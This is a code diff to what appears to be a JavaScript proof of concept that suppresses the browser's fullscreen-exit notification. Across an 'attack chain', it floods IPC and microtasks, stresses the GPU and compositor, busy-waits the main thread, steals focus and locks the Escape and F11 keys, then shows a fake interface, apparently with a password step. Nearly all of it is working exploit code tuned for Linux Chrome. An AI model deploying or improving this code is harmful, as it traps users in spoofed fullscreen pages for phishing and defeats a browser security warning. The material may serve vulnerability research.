@@ -208,7 +208,35 @@ function startGPUStress(iterations) {
     gl.bindTexture(gl.TEXTURE_2D, tex);
     gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1, 1, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixel);
   }
-  log('GPU stress: ' + iterations + ' textures created', 'ok');
+  // Flush GPU pipeline
+  gl.flush();
+  gl.finish();
+  log('GPU stress: ' + iterations + ' textures + flush/finish', 'ok');
+}
+
+// ────────────────────────────────────────────────────────────────
+// COMPOSITOR STRESS — khusus untuk Linux (X11/Wayland path)
+// ────────────────────────────────────────────────────────────────
+function startCompositorStress() {
+  // Buat banyak layer baru — paksa compositor membuat layer tree baru
+  // sebelum fullscreen, sehingga notification paint harus antri
+  const frag = document.createDocumentFragment();
+  for (let i = 0; i < 80; i++) {
+    const d = document.createElement('div');
+    d.style.cssText = `
+      position: fixed;
+      width: 1px; height: 1px;
+      transform: translateZ(${i}px);
+      will-change: transform;
+      opacity: 0;
+      top: ${i}px; left: ${i}px;
+    `;
+    frag.appendChild(d);
+  }
+  document.body.appendChild(frag);
+  // Force compositing
+  void document.body.offsetHeight;
+  log('Compositor stress: 80 GPU layers created', 'ok');
 }
 
 // ────────────────────────────────────────────────────────────────
@@ -242,7 +270,7 @@ const exitBtn    = document.getElementById('exit-btn');
 
 let fsRequested = false;
 
-btnLaunch.onclick = function() {
+btnLaunch.onclick = async function() {
   if (fsRequested) return;
   fsRequested = true;
   btnLaunch.disabled = true;
@@ -250,39 +278,73 @@ btnLaunch.onclick = function() {
   log('User gesture received — starting attack chain...');
 
   // ── Phase 1: IPC Flood BEFORE fullscreen request ──────────────
-  // Saturate browser↔renderer IPC channel
-  log('Phase 1: IPC flood (800 history mutations)...');
-  for (let i = 0; i < 800; i++) {
+  log('Phase 1: IPC flood (1500 history mutations)...');
+  for (let i = 0; i < 1500; i++) {
     history.replaceState(null, '', '#' + Math.random());
   }
   log('IPC flood done', 'ok');
 
-  // ── Phase 2: GPU Stress ────────────────────────────────────────
-  startGPUStress(300);
+  // ── Phase 2: GPU + compositor stress ──────────────────────────
+  startGPUStress(600);
+  startCompositorStress();
+
+  // ── Phase 2b: Keyboard lock BEFORE fullscreen ──────────────────
+  // Locks Escape key so notification is non-functional even if shown.
+  // navigator.keyboard.lock() must be called before requestFullscreen().
+  if (navigator.keyboard && navigator.keyboard.lock) {
+    try {
+      await navigator.keyboard.lock(['Escape', 'F11']);
+      log('Keyboard lock acquired (Escape disabled)', 'ok');
+    } catch(e) {
+      log('keyboard.lock() failed: ' + e.message, 'wrn');
+    }
+  } else {
+    log('keyboard.lock() not available — notification still closeable', 'wrn');
+  }
 
   // ── Phase 3: Request fullscreen (gesture still valid) ──────────
   log('Phase 3: requestFullscreen({ navigationUI: "hide" })...');
   const fsPromise = document.documentElement.requestFullscreen({ navigationUI: 'hide' });
 
-  // ── Wait for fullscreen confirmation, THEN block notification ───
-  // Busy-wait MUST be inside .then() — if run before, it blocks the
-  // browser↔renderer handshake and requestFullscreen() never resolves.
   fsPromise.then(() => {
     log('Fullscreen confirmed — starting notification suppression', 'ok');
     startTimer();
 
-    // Phase 4: Busy-wait INSIDE .then() — blocks main thread during
-    // the notification render window (notification appears AFTER entry)
-    log('Phase 4: Busy-wait 700ms + layout pressure...');
+    // Phase 4: Busy-wait — Linux needs longer window (1200ms vs 700ms)
+    // Chrome Linux compositor timing differs from Win/Mac.
+    log('Phase 4: Busy-wait 1200ms + layout thrash...');
     const t0 = performance.now();
-    while (performance.now() - t0 < 700) {
+    while (performance.now() - t0 < 1200) {
       history.replaceState(null, '', '#' + Math.random());
       void document.body.offsetHeight;
       void document.documentElement.scrollTop;
+      void document.body.getBoundingClientRect();
     }
     log('Busy-wait done: ' + Math.round(performance.now() - t0) + 'ms', 'ok');
 
-    // Phase 5: Focus stealing chain
+    // Phase 5: Microtask flood — blocks between paint frames
+    // Fills the microtask queue so notification paint is deferred
+    function floodMicrotasks(n) {
+      if (n <= 0 || !floodActive) return;
+      Promise.resolve().then(() => floodMicrotasks(n - 1));
+    }
+    floodMicrotasks(5000);
+    log('Phase 5: Microtask flood (5000 queued)', 'ok');
+
+    // Phase 6: RAF-based compositor pressure
+    // Keeps the compositor thread busy during notification window
+    let rafCount = 0;
+    function compositorPressure() {
+      if (!floodActive || rafCount > 120) return;
+      rafCount++;
+      // Force a style recalc + composite on every frame
+      document.documentElement.style.transform = `translateZ(${rafCount % 2}px)`;
+      void document.documentElement.offsetHeight;
+      requestAnimationFrame(compositorPressure);
+    }
+    requestAnimationFrame(compositorPressure);
+
+    // Phase 7: Focus stealing chain
     function stealFocus() {
       const inp = document.createElement('input');
       inp.style.cssText = 'position:fixed;top:-9999px';
@@ -293,9 +355,9 @@ btnLaunch.onclick = function() {
     }
     stealFocus();
 
-    // Phase 6: Message flood
+    // Phase 8: Message flood
     startMessageFlood();
-    log('Phase 5+6: Focus stealing + message flood active', 'ok');
+    log('Phases 6-8: RAF pressure + focus steal + msg flood active', 'ok');
 
     showFakeUI();
   }).catch(err => {
@@ -329,6 +391,10 @@ function showPassStep() {
 function exitFullscreen() {
   floodActive = false;
   fsRequested = false;
+  // Release keyboard lock when done
+  if (navigator.keyboard && navigator.keyboard.unlock) {
+    navigator.keyboard.unlock();
+  }
   const ms = stopTimer();
   log('Exiting — notification was visible for ~' + ms + 'ms', 'wrn');
   log('RESULT: ' + (ms < 500 ? 'BYPASS LIKELY — notification suppressed (<500ms)' : 'PATCHED — notification visible ' + ms + 'ms'), ms < 500 ? 'ok' : 'err');
